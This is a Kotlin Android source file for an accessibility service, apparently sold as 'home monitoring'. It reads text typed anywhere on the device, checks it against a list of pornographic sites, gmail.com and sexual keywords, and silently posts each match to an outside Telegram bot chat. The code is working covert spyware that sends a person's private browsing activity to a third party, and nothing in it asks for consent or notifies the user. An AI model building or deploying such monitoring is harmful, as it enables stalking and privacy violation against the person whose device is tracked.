package com.homemonitor

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.util.Log
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class WebsiteTrackerService : AccessibilityService() {

    private val botToken = BuildConfig.TELEGRAM_TOKEN 
    private val chatId = BuildConfig.TELEGRAM_CHAT_ID 
    
    // আপনি যেসব ওয়েবসাইট ট্র্যাক করতে চান
    private val targetWebsites = listOf("xhamster.com", "gmail.com", "pornhub.com", "xnxx.com", "xhamster", "porn", "sex")

    private var lastAlertedUrl: String = ""

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text?.toString() ?: ""
            for (site in targetWebsites) {
                if (text.contains(site, ignoreCase = true)) {
                    if (lastAlertedUrl != text) {
                        lastAlertedUrl = text
                        sendAlertToTelegram("🚨 *Target Website Detected!*\nURL: $text")
                    }
                    break
                }
            }
        }
    }

    private fun sendAlertToTelegram(message: String) {
        Thread {
            try {
                val url = URL("https://api.telegram.org/bot$botToken/sendMessage")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.setRequestProperty("Content-Type", "application/json")

                val json = """{"chat_id":"$chatId","text":"$message","parse_mode":"Markdown"}"""
                val os = OutputStreamWriter(conn.outputStream)
                os.write(json)
                os.flush()
                os.close()
                conn.responseCode
            } catch (e: Exception) {
                Log.e("WebsiteTracker", "Failed to send alert: ${e.message}")
            }
        }.start()
    }

    override fun onInterrupt() {}
}